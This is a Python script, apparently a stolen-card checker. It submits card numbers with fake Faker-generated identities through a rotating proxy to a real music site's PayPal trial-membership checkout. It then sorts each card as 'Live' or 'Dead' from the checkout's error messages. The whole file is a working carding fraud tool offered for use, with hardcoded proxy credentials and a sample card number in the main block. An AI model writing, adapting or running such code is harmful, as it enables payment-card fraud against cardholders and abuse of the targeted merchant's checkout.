
import random, time
from faker import Faker
from random import choice
from tkinter import Tk, filedialog
from httpx import request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b

from bs4 import BeautifulSoup

import json


import time
import re
def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password

def get_card_brand(cc_number: str) -> str:
    cc_number = cc_number.strip()

    if cc_number.startswith("4"):
        return "Visa"
    elif cc_number.startswith("5"):
        return "MasterCard"
    else:
        return "Unknown"

def procesar_tarjeta(card: str) -> str:   
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            PROXY_HOST = "p.webshare.io:80"
            PROXY_USER = "izvhxurt-rotate"
            PROXY_PASS = "acx0bzc9xbkg"
            
            PROXY_URL = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}"
            
            c = requests.Session()
            
            proxies = {
                "http": PROXY_URL,
                "https": PROXY_URL,
            }
            
            c.proxies.update(proxies)
            
            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
           

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#
            headers = {
                'authority': 'www.jazzeveryone.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                # 'cookie': '_gid=GA1.2.429663376.1767044094; _ga=GA1.1.878429916.1767044094; _ga_TYB998858C=GS2.1.s1767044094$o1$g1$t1767044203$j60$l0$h0',
                'origin': 'https://www.jazzeveryone.com',
                'pragma': 'no-cache',
                'referer': 'https://www.jazzeveryone.com/membership-details/full-trial-membership/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = {
                's2member_pro_paypal_checkout[coupon]': '',
                's2member_pro_paypal_checkout[first_name]': name,
                's2member_pro_paypal_checkout[last_name]': last,
                's2member_pro_paypal_checkout[email]': email,
                's2member_pro_paypal_checkout[username]': name+last,
                's2member_pro_paypal_checkout[password1]': 'Saiper123',
                's2member_pro_paypal_checkout[password2]': 'Saiper123',
                's2member_pro_paypal_checkout[custom_fields][opt_in]': '1',
                's2member_pro_paypal_checkout[custom_fields][referral]': '',
                's2member_pro_paypal_checkout[card_type]': get_card_brand(cc_number),
                's2member_pro_paypal_checkout[card_number]': cc_number,
                's2member_pro_paypal_checkout[card_expiration_month]': mes,
                's2member_pro_paypal_checkout[card_expiration_year]': ano_number,
                's2member_pro_paypal_checkout[card_verification]': cvv,
                's2member_pro_paypal_checkout[card_start_date_issue_number]': '',
                's2member_pro_paypal_checkout[street]': 'calle 89',
                's2member_pro_paypal_checkout[city]': 'Teabo',
                's2member_pro_paypal_checkout[state]': 'Yucatán',
                's2member_pro_paypal_checkout[zip]': '97910',
                's2member_pro_paypal_checkout[country]': 'MX',
                's2member_pro_paypal_checkout[nonce]': '4396fd6fcb',
                's2member_pro_paypal_checkout[attr]': 'ZGVmNTAyMDA1MTg2ZWZjZjgxZjI0YzRhODk1MWY1ZWJhYTU3OTJkYmY3MTIzZTdlNmRmMjI5OTE1NTdhYmFiNWVlODNmOTk3YmViMDIwYWJlNzAwMDY1MmE0OWMxNjVlODY2N2I2MDM2MjI0NmFhZDRkY2E4ODQ0Y2NiMTllOTdhNTQyNDhhZTliZjAyNzIzZTlhMmRiY2MwOWY4YzMyZDAyNzBhY2MxOWE1NGM4NTQwMDVkMDczOTYyZjgwNjM1YTIxMzIyNjlhZjM1MTAxMDMzNzRkOWI5MTllM2M3ZmVhMTZhMTMxZGU2ZDYyNTZhMDQ0NTVjYzhkNDMyYWMxY2Q2NzU1OTQwMDYzNWY5Mjk5ZTc0M2JjYmY1NWM0ZjZmYzc3ZTY2YTUzMzA5NDUxNjBkYWIzNGQwMGI1YjJiOTQ0ZGMxYzZkZmEzZDM2NDRjOTcwMDcxMWIzMzU3OGU4MWRiNjNkN2VhNGQwY2JlYTY0MGE3ZDE0ZDFhNDNmMzFlZmY1N2ZhNTY2YjgyNzU2M2FhN2U0MTE3MWZkODIwYjIyMzJmMTMzMjEyNThiNThiMTk5MTczMjlkNjRiNjgwMGYxNjdhNTIwODZjNzEyNWNiZmFiZDZjMjFiOTJhZDdiYTUwYzk1Njc1YTMyMWRkNjAxMWIyZTY5ODc0NDYzNjY3ZDYxZjI1YTU2NmQ1MjAwYmQwNWI3NjdmMGViOGIwNzk2MmY1MjEwM2Y5ZjlhYzc0OWZmM2M5MjUzZThiYzc2OWQ1ZWRmZDA2NzY2OGUwMTRiOTA2YjliN2ViYTE0MWRkOTlkODA5ZjhkMjRjZjUzMjRjN2E3YTQ1ZWRmNGI3ZDk3ZTU4MjM0ZjNhZWJlMjlhZjg4MzliMzBhZTVjYjU4Y2MyM2Q1ZDA1NmNlNmE4OWI0NDUxNGYzYmQzYmY1MmU4ZWY5MThjNjA5MjA2NzNlYWU3ODllMDEzZDg5MmE4NGQ0YjRhNDMwMjY1MzJlMWFlNTdlODVhNWZiYjQ4MTAxMDMwZTczNzFmNDI3OThmZTQxZTEyOWUxOTdjM2JjZTFlOWY5NDcxNGU3MjdmZjZkODY1N2EyMzRjMjQyNDVhM2YzNTk4YzIyODRhOWE2ZGY5ZmMwNTYzNDdjMTFlZGIwODM4YjNhMzBjZThlZGUxY2JkNGE4NjJlZjU1MThhZDU3ODEyZWYwMWI2MDhmYmQyOTc3MmQ3NWM1YWY3MGRmZjE4NTZkZDlmZDliMjQ1MGZiNWFkZWE0MTEyZDI1NjVlMzAwMGQ0NDc5YWM0NTc5MmI0MWIyNmE2Njk1OTdkNWNmMmE1ODMxMWIwYzNlZmE4N2I1Yzg1OWRlYWJiMWU2YzQ4MTE4ODcxMmUyZDE0NWY5NzQyNDc1MGRiMGJlODBhN2VkZGZiYTU3NWMyYjk1MGQ4M2QwYzUxODNiMzMzM2JlOWNjMGQzNmUxMzhjMmRmNWY0ZDc1MzY1Y2JjZWJiZWVlZGE5OGI0YWQwNzYxYjM2MGMzYzIwNDliNDlmOTFlZjU2OGI3NGRmMTE4OGFmMDQyMjEzOTRiZjk5N2YxMTIxN2Q2YzkzZmI1ZjljMTEwNWVhMzNiZjg5MWZhYzI0OWI4YzU4NjNmYjA0OGFiNjAzMzdlYWM5ZWJkMDkyODhkM2I5Y2VmY2ExMDY5MjA4ZTUzMDkxMGI1ZDM0N2YxZTY1ZDIwNGM3NzI5NDI4Mjk0OTZhZWQ2YTJlMWQyZTVlNjE3MTJhNzgzNTI2YTcyYmQ4Yjk1ZmVlYjYzMjFhYjI4MTY4YmYxYTYyYTQ0ODA5ZGU3Mzc3NzMwNGM2OTNkNmQ0ZjU3MGVhMGEwMDhhMTEwZWI5ZjI3Yjc0ZmFkNmE2YTAwM2EzZTc5MTA1YTk0MDM4MDBjYWU3OTcyZDkzMzU4MTRkMGU0Mjk5MGUzNTk0NjYyOTVjNzA5ZjQ5ODk4MzY1NWU4NWRiNzBkYWQ4NjUwYTAxMDg3ZGRmZWI4NDY1MjYxNWNjZmY2ZGYxMmJlMWVhZGFjNWNlNjIxODJjYjMxYWUyYWUxMWE3NmRlOWUzYjM5OTljNDQ3OTJhNjY0ZmI4OTgyMjA3YmI0YjkzMzdiOWNmYTAxZjJkNWMxZjg3MGUxYzU4OWMzM2Q2MzZhNzlkMjJlNzA5MjUzMDIzNTNiYTE1MjUwNGQyOGQ1NGNhNTliNTIwMDlkNWQzZTIxYjY0YzFiMjZjYzkzMjhjZGNhNTA2NGJmZTg2NWQ2ODY2ZDg5OTgxYzZjNzk4ZTAyYTA2MDkxM2FkYzU2YjBkMGEzZjg4MGU2NDAzMzc1MzYzNTU0YmQ2Y2IxMDllZmIzNDBhYzQyYTU2NWYzODM3YTljNzEwOGQ0Y2UyZWUxNmY0YmU5ZDBhYzZmNmM5YWQ1NmUzNDg4ZDFjNjNmOGE1OTc5MTMyN2IyOTcyYWNlNGYxYWU3ZmM0Y2NmMGJkNDRjM2E4ZGYwZTAxYjJjN2JmOWQ0Y2Q2ZjBlYjQ1YTgwZjI0Nzk5Y2U0YTg0ZDU4ZDQ0NzZhMjM2ZGViNWJlYTA3NzkwYWJhMjFhYjViNDBkMWZhYWFlNTU1ZjdlYWE4MzNkODE2YmQyYzkzMjMwM2YzM2I1YTlhZmY2NzE3YTEwMGZmNGY0NTk1NjFiNTA0N2RhYTM5ZjZmYTBmMzgyOTkzZmMxYWZmNjU4ODk1ZjQxZDM3ZTI3NjAwYmUyMjJiOTM0MWE5MTMwMGQ5YjQ4ZjI5MzU5MjQzMWRlZDhmODRkYzJmNzNhNDVmYzU4NTczMDZlOWJmYjg0MDQ5YTczMTk1NDAwMTczNzE0NjAzNGI0ZWY4ZmFjMTJlNDg0M2E3ZTJkNjFmNjIzNzVlZDdiZGVhOTk5ZDQ5ODFhOTViODJmYzk3YzViZWNiMmNlNDBjMDg2NGY5MmEyMzc1N2U0ODljNTJiMDJjOWExNjc2MzkxMTQ5MWU0YTBjZTZhZWY1ZmRmMGY3ZWFlMjE3NzJkZjU0NzI0NGZmYmNkOGY2Y2NkNzI3MTg0OWRiOTUxZTdmMDk1NjgzMWViNGNmYzRmZjA5MzU2ZjZlMGMw',
            }

            response = requests.post(
                'https://www.jazzeveryone.com/membership-details/full-trial-membership/',
               
                headers=headers,
                data=data,
            )


            
            html = response.text
            soup = BeautifulSoup(html, "html.parser")

            mensaje = (
                # s2Member / PayPal
                soup.find("div", id="s2member-pro-paypal-form-response")
                # Paid Memberships Pro
                or soup.find("div", class_="pmpro_message")
                # Fallback: cualquier div que contenga "error"
                or soup.find("div", class_=lambda x: x and "error" in x.lower())
            )

            if mensaje:
                texto = mensaje.get_text(" ", strip=True)
                print("Mensaje de la página:", texto)

                # 🔹 CASO ESPECIAL: Processor Decline = LIVE (no charged)
                if "Error #15005" in texto or "Processor Decline" in texto:
                    return {
                        "status": "Live",
                        "message": "Live no charged",
                        "cc": card
                    }

                # 🔴 Cualquier otro error = Dead
                return {
                    "status": "Dead",
                    "message": texto,
                    "cc": card
                }

            else:
                print("No se encontró mensaje de error")
                return {
                    "status": "Live",
                    "message": "Live Auth",
                    "cc": card
                }

        except Exception as e:
            print(e)
            retry_count += 1
    else:

        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}


if __name__ == "__main__":
    print(procesar_tarjeta("5288920798883089|05|2033|737"))
